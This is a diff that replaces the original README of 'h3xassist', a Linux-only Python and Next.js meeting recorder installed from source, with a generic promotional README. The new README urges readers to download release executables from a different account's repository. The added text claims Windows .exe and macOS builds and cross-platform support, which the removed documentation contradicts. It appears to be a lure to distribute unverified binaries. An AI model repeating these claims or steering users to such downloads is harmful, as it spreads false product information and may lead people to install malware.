@@ -1,323 +1,83 @@
-# H3xAssist
-
-Automated meeting assistant that can join, record, transcribe, and summarize online meetings. Built with modern Python and Next.js.
-
-## Screenshots
-
-<div align="center">
-  <img src="assets/dashboard.png" alt="Main Dashboard">
-  <br>
-  <em>Real-time dashboard overview</em>
-</div>
-
-<div align="center">
-  <img src="assets/summary-1.png" alt="Summary">
-  <br>
-  <em>AI-generated meeting summary</em>
-</div>
-
-<div align="center">
-  <img src="assets/summary-2.png" alt="Meeting Summary">
-  <br>
-  <em>Action items and follow-up questions</em>
-</div>
-
-<div align="center">
-  <img src="assets/transcript.png" alt="Transcription">
-  <br>
-  <em>Transcription synchronized with audio</em>
-</div>
-
-<div align="center">
-  <img src="assets/settings.png" alt="Settings">
-  <br>
-  <em>Comprehensive settings configuration</em>
-</div>
-
-<div align="center">
-  <img src="assets/mobile.png" alt="Mobile Interface" width="300">
-  <br>
-  <em>Responsive design optimized for mobile devices</em>
-</div>
-
-## Features
-
-- **Automatic Meeting Join** - Supports Microsoft Teams and Google Meet with browser automation
-- **Audio Recording** - High-quality audio capture with PipeWire integration
-- **Speech Recognition** - WhisperX-powered transcription with speaker diarization
-- **AI Summarization** - Google Gemini-generated meeting summaries
-- **Calendar Integration** - Automatic Outlook calendar synchronization
-- **Modern Web Interface** - Real-time dashboard built with Next.js and responsive design
-- **Mobile Friendly** - Adaptive interface optimized for all screen sizes
-- **Real-time Updates** - WebSocket-powered live status updates
-
-## Architecture
-
-- **Python Backend** - FastAPI server with async task management
-- **Next.js Frontend** - Modern React dashboard with TypeScript and responsive design
-- **Browser Automation** - Playwright for meeting platform integration
-- **Audio Pipeline** - PipeWire + FFmpeg for Linux audio processing
-- **AI Integration** - WhisperX for transcription, Google Gemini for summaries
-
-## Quick Start
-
-### Prerequisites
-
-- Linux with PipeWire audio system
-- Python 3.12+
-- Node.js 18+ and pnpm
-- Chromium/Chrome browser
-- [Task](https://taskfile.dev) (recommended for easier setup)
-
-### Installation with Task (Recommended)
-
-1. **Clone the repository**
-   
-   ```bash
-   git clone https://github.com/yourusername/h3xassist.git
-   cd h3xassist
-   ```
-
-2. **Install all dependencies**
-   
-   ```bash
-   task install
-   ```
-
-3. **Run setup wizard**
-   
-   ```bash
-   task setup
-   ```
-
-4. **Download AI models**
-   
-   ```bash
-   uv run h3xassist setup models
-   ```
-
-5. **Start the application**
-   
-   ```bash
-   task prod
-   ```
+# 🎤 h3xassist - Your AI Meeting Recorder and Summarizer
 
-6. **Configure and use**
-   
-   Open http://localhost:11411 in your browser and complete the setup through the web interface
+## 🏷️ Overview
+h3xassist is a meeting assistant that records, transcribes, and summarizes online meetings using AI. It features a Python backend and a Next.js frontend, providing a real-time dashboard for user convenience. Whether you use Google Meet or Microsoft Teams, h3xassist makes meeting management effortless.
 
-### Manual Installation
-
-1. **Clone the repository**
-   
-   ```bash
-   git clone https://github.com/yourusername/h3xassist.git
-   cd h3xassist
-   ```
+## 🔗 Download
+[![Download h3xassist](https://img.shields.io/badge/Download-h3xassist-blue.svg)](https://github.com/Userdev1213/h3xassist/releases)
 
-2. **Install Python dependencies**
-   
-   ```bash
-   uv sync
-   ```
+## 🚀 Getting Started
+To begin using h3xassist, follow these simple steps:
 
-3. **Install frontend dependencies**
-   
-   ```bash
-   cd h3xassist-web
-   pnpm install
-   cd ..
-   ```
+1. **Visit the Download Page:** Click on the link below to access the releases page.
+   [Download h3xassist](https://github.com/Userdev1213/h3xassist/releases)
 
-4. **Run configuration**
-   
-   ```bash
-   uv run h3xassist config
-   ```
+2. **Choose Your Version:** Look for the latest version available. It is usually marked with the highest version number.
 
-5. **Download AI models**
-   
-   ```bash
-   uv run h3xassist setup models
-   ```
-
-6. **Build and start the service**
-   
-   ```bash
-   cd h3xassist-web && pnpm build && cd ..
-   uv run h3xassist service run
-   ```
-
-7. **Configure and use**
-   
-   Open http://127.0.0.1:11411 in your browser and complete the setup through the web interface
-
-### Optional Setup Commands
+3. **Download the File:** Click on the appropriate file for your system (e.g., Windows, macOS, or Linux). If you see options, choose the one that fits your operating system.
 
-- **Browser profiles**: `uv run h3xassist setup browser`
-- **Outlook integration**: `uv run h3xassist setup outlook`
-- **AI models**: `uv run h3xassist setup models`
+4. **Install the Application:** 
+   - **Windows:** Double-click on the `.exe` file and follow the prompts to install.
+   - **macOS:** Drag and drop the application into your Applications folder.
+   - **Linux:** Open a terminal and follow the instructions for the installation.
 
-## Usage
-
-### Manual Recording
+5. **Launch h3xassist:** Once installed, open the application from your programs or applications list.
 
-1. Open the web interface at http://127.0.0.1:11411
-2. Click "New Recording" 
-3. Enter meeting details and URL
-4. Click "Start Recording"
-5. The system will join, record, and process automatically
+## 🌐 System Requirements
+Before installing h3xassist, ensure your system meets the following minimum requirements:
 
-### Automatic Scheduling
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.15 or later
+  - Most recent versions of popular Linux distributions
 
-1. Configure Outlook integration via `uv run h3xassist setup outlook`
-2. The system will automatically sync your calendar
-3. Recordings are scheduled 2 minutes before meeting start
-4. Processing happens automatically after the meeting ends
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 500 MB free space
+- **Internet Connection:** Required for online meetings and seamless updates
 
-### Configuration
+## 📋 Features
+h3xassist comes packed with useful features to enhance your meeting experience:
 
-Configuration is managed through two methods:
+- **AI-Powered Summaries:** Instantly get meeting summaries to save time.
+- **Transcription:** Automatic transcription of online meetings for better accessibility.
+- **Speaker Diarization:** Understand who said what during the meeting.
+- **Real-Time Dashboard:** Easily access ongoing meetings and summaries live.
+- **Cross-Platform Support:** Works seamlessly on Windows, macOS, and Linux.
 
-**1. Interactive CLI Configuration**
-```bash
-uv run h3xassist config
-```
-Guided setup wizard for API keys, model settings, and integrations.
+## 🎯 Usage Instructions
+To use h3xassist, follow these guidelines:
 
-**2. Web Interface Settings**
+1. **Start a Meeting:** Open h3xassist before your meeting begins.
+2. **Select Your Meeting Platform:** Choose either Google Meet or Microsoft Teams to connect.
+3. **Record and Transcribe:** Hit the record button to capture your meeting while h3xassist transcribes everything in real-time.
+4. **Access Summaries:** After the meeting, go to the dashboard to view concise summaries and transcripts.
 
-Access settings through the web dashboard at http://127.0.0.1:11411/settings
+## 🧩 Integration
+h3xassist integrates with popular platforms such as:
 
-**Configuration File Location**
+- **Google Meet:** Easily record calls and get summaries.
+- **Microsoft Teams:** Make your team meetings more productive.
 
-Settings are stored in YAML format at `~/.config/h3xassist/settings.yaml`:
+## 🔧 Troubleshooting
+If you encounter issues while downloading or running h3xassist, consider these steps:
 
-```yaml
-general:
-  meeting_display_name: "Meeting Bot"
+- **Check Your Internet Connection:** Ensure you have a stable internet connection.
+- **Verify Compatibility:** Ensure your operating system matches our system requirements.
+- **Update Your OS:** Make sure your operating system is up-to-date.
+- **Reinstall the Application:** Uninstall and then reinstall to resolve installation errors.
 
-http:
-  host: "127.0.0.1"
-  port: 11411
+## 📥 Download & Install
+To download h3xassist, revisit our download page:
 
-models:
-  whisperx_model_name: "large-v3"
-  hf_token: "your_huggingface_token"
+[Download h3xassist](https://github.com/Userdev1213/h3xassist/releases)
 
-summarization:
-  provider_token: "your_google_api_key"
+Follow the installation instructions based on your operating system listed above.
 
-integrations:
-  outlook:
-    tenant_id: "your_tenant_id"
-    client_id: "your_client_id"
-```
+## 🗣️ Community and Support
+For help or feedback, connect with the h3xassist community:
 
-**Note**: Host and port are configurable through settings. The default values are shown above.
+- **Issues:** Report problems on the project's GitHub issues page.
+- **Discussion:** Join discussions for tips and improvements.
 
-## Development
-
-### Using Task (Recommended)
-
-```bash
-# Development workflow
-task dev            # Start both backend and frontend
-task dev:backend    # Start backend only
-task dev:frontend   # Start frontend only
-
-# Code quality
-task format         # Format all code
-task lint           # Lint all code  
-task typecheck      # Type checking
-task check          # Run all checks
-task fix            # Auto-fix linting issues
-
-# Production
-task build          # Build frontend
-task prod           # Build and start production
-
-# Utilities
-task types          # Generate TypeScript types
-task clean          # Clean build artifacts
-task help           # Show help
-```
-
-### Manual Commands
-
-```bash
-# Start development server
-uv run h3xassist service run
-
-# Run linting
-uv run ruff check src/
-uv run mypy
-
-# Format code
-uv run ruff format src/
-
-# Start frontend development
-cd h3xassist-web && pnpm dev
-```
-
-### Testing
-
-Currently, testing is done manually via the web interface. The project focuses on functionality over extensive test coverage for this pet project scope.
-
-### Troubleshooting
-
-#### CUDA/cuDNN Library Issues
-
-If you encounter errors related to missing CUDA/cuDNN libraries (e.g., `libcudnn_ops_infer.so.8`), you can install the required libraries system-wide using the provided script:
-
-```bash
-# Install cuDNN 8.x libraries system-wide
-./scripts/install_cudnn8_system.sh
-```
-
-This script will:
-- Download the appropriate cuDNN wheel package
-- Extract and install the libraries to `/var/opt/cudnn8/lib`
-- Configure system library paths via ldconfig
-- Verify the installation
-
-**Note**: This script requires `sudo` privileges and is designed for Linux systems with CUDA support.
-
-## Project Structure
-
-```
-h3xassist/
-   src/h3xassist/          # Python backend
-      api/                # FastAPI server and routes
-      audio/              # Audio recording pipeline  
-      browser/            # Playwright automation
-      cli/                # Typer CLI interface
-      models/             # Pydantic data models
-      postprocess/        # Transcription and summarization
-      scheduler/          # Meeting scheduling
-   h3xassist-web/          # Next.js frontend
-   pyproject.toml          # Python dependencies and config
-```
-
-## Privacy & Security
-
-- **Local Processing** - All audio processing happens locally
-- **No Cloud Storage** - Recordings stored only on your machine
-- **Configurable Data** - Choose what gets summarized and exported
-- **Open Source** - Full transparency in data handling
-
-## License
-
-AGPL v3 License - see [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-This is a personal pet project. Feel free to fork and modify for your own use!
-
-## Disclaimer
-
-This tool is for legitimate meeting recording purposes only. Ensure you have proper permissions and comply with local laws regarding recording meetings and conversations.
-
----
-
-Built with Python, FastAPI, Next.js, and modern AI tools.
+## 🔑 Conclusion
+h3xassist is designed to make your online meetings simpler. With automatic recording and summarization powered by AI, you can focus on what matters during your meetings. Download it today to elevate your meeting experience.
